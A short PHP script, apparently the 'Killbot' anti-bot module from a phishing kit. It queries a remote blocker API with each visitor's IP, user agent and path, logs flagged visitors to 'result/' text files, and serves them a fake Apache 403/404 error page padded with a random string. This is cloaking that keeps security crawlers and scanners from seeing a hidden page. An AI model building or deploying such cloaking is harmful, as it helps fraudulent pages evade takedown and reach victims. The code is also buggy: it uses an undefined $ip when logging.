<?php
#######################################################################################################
$config['apikey']   = trim(file_get_contents("killbot.ini"));            // https://killbot.pw/developers
#######################################################################################################

class Killbot {
    function apikey($api_key) {
        $this->apikey = $api_key;
    }

    function get_client_ip() {
        // Get real visitor IP behind CloudFlare network
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
            $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
            $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } elseif(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        
        return $ip;
    }
    
    function httpGet($url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        return $response;
    }

    function check() {
        $ip         = $this->get_client_ip();
        $respons    = $this->httpGet("https://killbot.org/api/v1/blocker?ip=".$ip."&apikey=".$this->apikey."&ua=".urlencode($_SERVER['HTTP_USER_AGENT'])."&url=".urldecode($_SERVER['REQUEST_URI']));
        $json       = json_decode($respons,true);
        if($json['data']['block_access'] == true){
            return true;
        } else {
            return false;
        }
    }
}
if (isset($config['apikey'])) {
	$Killbot = new Killbot;
	$Killbot->apikey( $config['apikey'] );
	if($Killbot->check() == true){
	    $file = fopen("result/killbot-block.txt","a");
        $message = $ip."\n";
        fwrite($file, $message);
        fclose($file);
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip (Killbot Blocker)"."\n");
        fclose($click);
        header('HTTP/1.0 403 Forbidden');
        die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVserver.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
	}
}
?>